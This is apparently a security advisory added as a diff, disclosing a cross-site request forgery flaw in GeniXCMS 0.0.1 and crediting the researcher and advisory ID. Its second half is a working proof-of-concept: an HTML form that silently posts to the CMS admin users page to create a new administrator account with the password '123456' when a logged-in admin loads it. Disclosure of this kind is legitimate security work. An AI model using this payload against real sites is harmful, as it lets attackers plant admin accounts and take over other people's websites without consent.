@@ -1,0 +1,49 @@
+
+GeniXCMS v0.0.1 CSRF Add Admin Exploit
+
+Vendor: MetalGenix
+Product web page: http://www.genixcms.org
+Affected version: 0.0.1
+
+Summary: GenixCMS is a PHP Based Content Management System and Framework (CMSF).
+It's a simple and lightweight of CMSF. Very suitable for Intermediate PHP developer to
+Advanced Developer. Some manual configurations are needed to make this application to
+work.
+
+Desc: The application allows users to perform certain actions via HTTP requests without
+performing any validity checks to verify the requests. This can be exploited to perform
+certain actions with administrative privileges if a logged-in user visits a malicious web
+site.
+
+Tested on: nginx/1.4.6 (Ubuntu)
+           Apache 2.4.10 (Win32)
+           PHP 5.6.3
+           MySQL 5.6.21
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5234
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5234.php
+
+
+05.03.2015
+
+---
+
+
+<html>
+  <body>
+    <form action="http://localhost/genixcms/gxadmin/index.php?page=users" method="POST">
+      <input type="hidden" name="userid" value="Testingus" />
+      <input type="hidden" name="pass1" value="123456" />
+      <input type="hidden" name="pass2" value="123456" />
+      <input type="hidden" name="email" value="t00t&#64;zeroscience&#46;eu" />
+      <input type="hidden" name="group" value="0" />
+      <input type="hidden" name="adduser" value="" />
+      <input type="submit" value="Forge!" />
+    </form>
+  </body>
+</html>
